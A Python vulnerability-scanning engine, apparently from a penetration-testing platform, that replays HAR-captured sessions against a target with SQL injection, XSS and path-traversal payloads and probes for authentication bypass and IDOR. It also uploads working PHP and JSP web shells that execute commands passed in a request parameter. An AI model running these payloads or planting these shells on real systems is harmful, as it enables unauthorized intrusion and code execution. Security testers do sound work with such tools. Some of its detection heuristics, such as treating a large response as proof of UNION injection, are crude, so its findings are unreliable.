#!/usr/bin/env python3
"""
HAR-Based VAPT Engine for Vikramaditya Platform
Performs comprehensive vulnerability testing using HAR-extracted data
"""

import json
import requests
import urllib3
import time
import io
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HARVAPTEngine:
    """Comprehensive VAPT testing engine using HAR file data"""

    def __init__(self, har_analysis: Dict, output_dir: str = None):
        self.analysis = har_analysis
        self.session_data = har_analysis.get('session_data', {})
        self.endpoints = har_analysis.get('endpoints', [])
        self.attack_surface = har_analysis.get('attack_surface', {})
        self.config = har_analysis.get('config', {})
        self.output_dir = output_dir or f"vapt_results_{int(time.time())}"

        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 30

        # Configure session with authentication data
        self._configure_session()

        self.vulnerabilities = []
        self.test_results = {}

    def _configure_session(self):
        """Configure requests session with authentication data"""

        # Set cookies
        if self.session_data.get('cookies'):
            for name, value in self.session_data['cookies'].items():
                self.session.cookies.set(name, value)

        # Set headers
        if self.session_data.get('headers'):
            self.session.headers.update(self.session_data['headers'])

        # Set User-Agent if not present
        if 'User-Agent' not in self.session.headers:
            self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    def log_vulnerability(self, vuln_type: str, endpoint: str, details: str, severity: str = 'medium'):
        """Log a discovered vulnerability"""
        vulnerability = {
            'timestamp': datetime.now().isoformat(),
            'type': vuln_type,
            'endpoint': endpoint,
            'details': details,
            'severity': severity,
            'method': 'har_vapt_engine'
        }
        self.vulnerabilities.append(vulnerability)
        print(f"🚨 [{severity.upper()}] {vuln_type}: {endpoint}")
        print(f"   {details}")

    def test_sql_injection(self) -> Dict:
        """Test for SQL injection vulnerabilities"""
        print("\n🧪 Testing SQL Injection...")

        results = {
            'tested_endpoints': 0,
            'vulnerable_endpoints': [],
            'payloads_tested': 0
        }

        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' UNION SELECT 1,1,1--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "') OR '1'='1'--"
        ]

        for endpoint in self.endpoints:
            if not endpoint.get('vulnerability_indicators') or 'sqli_param' not in endpoint['vulnerability_indicators']:
                continue

            results['tested_endpoints'] += 1
            endpoint_url = endpoint['url']
            method = endpoint['method']

            # Test GET parameters
            for param, values in endpoint.get('query_params', {}).items():
                for payload in sql_payloads:
                    results['payloads_tested'] += 1

                    # Create test URL with SQL injection payload
                    test_url = endpoint_url.replace(f"{param}={values[0]}", f"{param}={payload}")

                    try:
                        response = self.session.get(test_url)

                        # Check for SQL injection indicators
                        content = response.text.lower()
                        sql_errors = ['mysql_', 'sql syntax', 'ora-', 'sqlite_error', 'postgresql']

                        if any(error in content for error in sql_errors):
                            self.log_vulnerability(
                                'SQL Injection - Error Based',
                                test_url,
                                f"SQL error detected in parameter '{param}' with payload: {payload}",
                                'critical'
                            )
                            results['vulnerable_endpoints'].append(endpoint_url)
                            break

                        # Check for time-based injection (simplified)
                        if 'WAITFOR' in payload:
                            start_time = time.time()
                            response = self.session.get(test_url)
                            response_time = time.time() - start_time

                            if response_time > 5:
                                self.log_vulnerability(
                                    'SQL Injection - Time Based',
                                    test_url,
                                    f"Time delay detected ({response_time:.2f}s) in parameter '{param}'",
                                    'critical'
                                )
                                results['vulnerable_endpoints'].append(endpoint_url)
                                break

                        # Check for union-based injection (response size difference)
                        if len(response.content) > 50000:  # Large response might indicate UNION success
                            self.log_vulnerability(
                                'SQL Injection - Union Based',
                                test_url,
                                f"Large response ({len(response.content)} bytes) suggests UNION injection in '{param}'",
                                'critical'
                            )
                            results['vulnerable_endpoints'].append(endpoint_url)
                            break

                    except Exception as e:
                        print(f"   ❌ Error testing {test_url}: {e}")

        self.test_results['sql_injection'] = results
        return results

    def test_file_upload_rce(self) -> Dict:
        """Test file upload endpoints for RCE vulnerabilities"""
        print("\n🧪 Testing File Upload RCE...")

        results = {
            'tested_endpoints': 0,
            'vulnerable_endpoints': [],
            'uploaded_files': []
        }

        # Malicious file payloads
        malicious_files = {
            'php_shell.php': {
                'content': '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
                'mime': 'application/x-php'
            },
            'test.phtml': {
                'content': '<?php system($_GET["c"]); ?>',
                'mime': 'application/x-httpd-php'
            },
            'image.php.jpg': {
                'content': '<?php phpinfo(); ?>',
                'mime': 'image/jpeg'
            },
            'shell.jsp': {
                'content': '<%@ page import="java.io.*" %><% if(request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>',
                'mime': 'application/x-jsp'
            }
        }

        for endpoint in self.attack_surface.get('file_uploads', []):
            if endpoint['method'] not in ['POST', 'PUT']:
                continue

            results['tested_endpoints'] += 1
            endpoint_url = endpoint['url']

            for filename, file_data in malicious_files.items():
                try:
                    # Prepare file upload
                    files = {
                        'file': (filename, file_data['content'], file_data['mime']),
                        'bulk_add_user': (filename, file_data['content'], file_data['mime'])  # Common parameter name
                    }

                    # Try different file parameter names
                    for param_name in ['file', 'upload', 'document', 'bulk_add_user']:
                        test_files = {param_name: (filename, file_data['content'], file_data['mime'])}

                        response = self.session.post(endpoint_url, files=test_files)

                        if response.status_code == 200:
                            # Check for upload success indicators
                            content = response.text.lower()
                            success_indicators = ['success', 'uploaded', 'saved', 'complete']

                            if any(indicator in content for indicator in success_indicators):
                                self.log_vulnerability(
                                    'File Upload RCE',
                                    endpoint_url,
                                    f"Malicious file '{filename}' uploaded successfully via parameter '{param_name}'",
                                    'critical'
                                )
                                results['vulnerable_endpoints'].append(endpoint_url)
                                results['uploaded_files'].append({
                                    'filename': filename,
                                    'endpoint': endpoint_url,
                                    'parameter': param_name
                                })

                except Exception as e:
                    print(f"   ❌ Error testing file upload {endpoint_url}: {e}")

        self.test_results['file_upload_rce'] = results
        return results

    def test_authentication_bypass(self) -> Dict:
        """Test for authentication bypass vulnerabilities"""
        print("\n🧪 Testing Authentication Bypass...")

        results = {
            'tested_endpoints': 0,
            'vulnerable_endpoints': [],
            'bypass_methods': []
        }

        # Create unauthenticated session
        unauth_session = requests.Session()
        unauth_session.verify = False
        unauth_session.timeout = 30
        unauth_session.headers['User-Agent'] = self.session.headers.get('User-Agent', '')

        for endpoint in self.attack_surface.get('admin_endpoints', []):
            results['tested_endpoints'] += 1
            endpoint_url = endpoint['url']

            try:
                # Test 1: No authentication
                response = unauth_session.get(endpoint_url)

                if response.status_code == 200 and len(response.content) > 1000:
                    # Check for admin content
                    content = response.text.lower()
                    admin_indicators = ['admin', 'dashboard', 'management', 'users', 'settings']

                    if any(indicator in content for indicator in admin_indicators):
                        self.log_vulnerability(
                            'Authentication Bypass',
                            endpoint_url,
                            'Admin endpoint accessible without authentication',
                            'high'
                        )
                        results['vulnerable_endpoints'].append(endpoint_url)
                        results['bypass_methods'].append('no_authentication')

                # Test 2: Invalid session tokens
                invalid_session = requests.Session()
                invalid_session.verify = False
                invalid_session.timeout = 30
                invalid_session.cookies.set('session_id', 'INVALID_TOKEN_12345')
                invalid_session.cookies.set('login', 'hacker@evil.com')

                response = invalid_session.get(endpoint_url)

                if response.status_code == 200 and len(response.content) > 1000:
                    self.log_vulnerability(
                        'Weak Authentication',
                        endpoint_url,
                        'Endpoint accepts invalid session tokens',
                        'medium'
                    )
                    results['vulnerable_endpoints'].append(endpoint_url)
                    results['bypass_methods'].append('invalid_session')

            except Exception as e:
                print(f"   ❌ Error testing authentication bypass {endpoint_url}: {e}")

        self.test_results['authentication_bypass'] = results
        return results

    def test_idor(self) -> Dict:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        print("\n🧪 Testing IDOR...")

        results = {
            'tested_endpoints': 0,
            'vulnerable_endpoints': [],
            'enumeration_successful': []
        }

        # Test user enumeration endpoints
        enumeration_endpoints = [ep for ep in self.endpoints if 'user' in ep['path'].lower()]

        test_users = [
            'test@example.com',
            'admin@test.com',
            'user@test.com',
            'support@test.com',
            '../admin',
            '../../etc/passwd',
            '1', '2', '3', '100'
        ]

        for endpoint in enumeration_endpoints:
            if endpoint['method'] != 'GET':
                continue

            results['tested_endpoints'] += 1
            endpoint_url = endpoint['url']
            baseline_response = None

            # Establish baseline
            try:
                baseline_response = self.session.get(endpoint_url)
                baseline_size = len(baseline_response.content)
            except Exception:
                continue

            # Test different user inputs
            for test_user in test_users:
                try:
                    # Replace user parameter in URL
                    test_url = endpoint_url
                    for param, values in endpoint.get('query_params', {}).items():
                        if 'user' in param.lower() or 'id' in param.lower():
                            test_url = test_url.replace(f"{param}={values[0]}", f"{param}={test_user}")

                    response = self.session.get(test_url)

                    # Check for size differences indicating enumeration
                    size_diff = len(response.content) - baseline_size

                    if abs(size_diff) > 5:  # Significant size difference
                        self.log_vulnerability(
                            'IDOR - User Enumeration',
                            test_url,
                            f"Response size difference ({size_diff} bytes) indicates user enumeration possible",
                            'medium'
                        )
                        results['vulnerable_endpoints'].append(endpoint_url)
                        results['enumeration_successful'].append(test_user)

                except Exception as e:
                    print(f"   ❌ Error testing IDOR {test_url}: {e}")

        self.test_results['idor'] = results
        return results

    def test_xss(self) -> Dict:
        """Test for Cross-Site Scripting vulnerabilities"""
        print("\n🧪 Testing XSS...")

        results = {
            'tested_endpoints': 0,
            'vulnerable_endpoints': [],
            'payloads_tested': 0
        }

        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")'
        ]

        for endpoint in self.endpoints:
            if not endpoint.get('query_params'):
                continue

            results['tested_endpoints'] += 1
            endpoint_url = endpoint['url']

            # Test GET parameters for XSS
            for param, values in endpoint.get('query_params', {}).items():
                for payload in xss_payloads:
                    results['payloads_tested'] += 1

                    try:
                        test_url = endpoint_url.replace(f"{param}={values[0]}", f"{param}={payload}")
                        response = self.session.get(test_url)

                        # Check if payload is reflected in response
                        if payload in response.text:
                            self.log_vulnerability(
                                'Cross-Site Scripting (XSS)',
                                test_url,
                                f"XSS payload reflected in parameter '{param}': {payload}",
                                'high'
                            )
                            results['vulnerable_endpoints'].append(endpoint_url)
                            break

                    except Exception as e:
                        print(f"   ❌ Error testing XSS {test_url}: {e}")

        self.test_results['xss'] = results
        return results

    def run_comprehensive_scan(self) -> Dict:
        """Run comprehensive vulnerability assessment"""
        print(f"🚀 Starting comprehensive VAPT scan...")
        print(f"📊 Target: {self.config.get('target_domain', 'Unknown')}")
        print(f"🎯 Testing {len(self.endpoints)} endpoints")

        start_time = time.time()

        # Run all vulnerability tests
        sql_results = self.test_sql_injection()
        file_upload_results = self.test_file_upload_rce()
        auth_bypass_results = self.test_authentication_bypass()
        idor_results = self.test_idor()
        xss_results = self.test_xss()

        end_time = time.time()
        scan_duration = end_time - start_time

        # Generate summary
        summary = {
            'scan_info': {
                'target': self.config.get('target_domain'),
                'start_time': datetime.fromtimestamp(start_time).isoformat(),
                'end_time': datetime.fromtimestamp(end_time).isoformat(),
                'duration_seconds': scan_duration,
                'endpoints_tested': len(self.endpoints)
            },
            'vulnerability_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'medium']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'low'])
            },
            'test_results': self.test_results,
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }

        return summary

    def _generate_recommendations(self) -> List[str]:
        """Generate remediation recommendations based on findings"""
        recommendations = []

        vuln_types = set(v['type'] for v in self.vulnerabilities)

        if 'SQL Injection' in str(vuln_types):
            recommendations.extend([
                'Implement parameterized queries for all database interactions',
                'Add input validation and sanitization for all parameters',
                'Use prepared statements and stored procedures',
                'Implement proper error handling to prevent information disclosure'
            ])

        if 'File Upload RCE' in str(vuln_types):
            recommendations.extend([
                'Implement strict file type validation',
                'Scan uploaded files for malicious content',
                'Store uploaded files outside the web root',
                'Implement file size and upload rate limiting'
            ])

        if 'Authentication Bypass' in str(vuln_types):
            recommendations.extend([
                'Implement proper authentication controls on all admin endpoints',
                'Add session timeout and regeneration',
                'Implement role-based access control (RBAC)',
                'Add IP-based access restrictions for administrative functions'
            ])

        if 'IDOR' in str(vuln_types):
            recommendations.extend([
                'Implement proper authorization checks for data access',
                'Use indirect object references or UUIDs',
                'Add access control lists (ACLs) for sensitive data',
                'Log all data access attempts for monitoring'
            ])

        if 'XSS' in str(vuln_types):
            recommendations.extend([
                'Implement output encoding for all user inputs',
                'Use Content Security Policy (CSP) headers',
                'Validate and sanitize all input data',
                'Use security libraries for XSS prevention'
            ])

        return recommendations

    def save_results(self, filename: str = None) -> str:
        """Save scan results to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"har_vapt_results_{timestamp}.json"

        try:
            results = self.run_comprehensive_scan()
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, default=str)

            print(f"\n💾 Results saved to: {filename}")
            return filename
        except Exception as e:
            print(f"❌ Error saving results: {e}")
            return None


def main():
    """Command-line interface for HAR VAPT Engine"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python har_vapt_engine.py <har_analysis_file> [output_file]")
        return

    analysis_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else None

    try:
        with open(analysis_file, 'r') as f:
            har_analysis = json.load(f)

        engine = HARVAPTEngine(har_analysis)
        result_file = engine.save_results(output_file)

        if result_file:
            print(f"\n🎉 VAPT scan completed successfully!")
            print(f"📊 Found {len(engine.vulnerabilities)} vulnerabilities")
            print(f"📋 Results saved to: {result_file}")

    except Exception as e:
        print(f"❌ Error: {e}")


if __name__ == "__main__":
    main()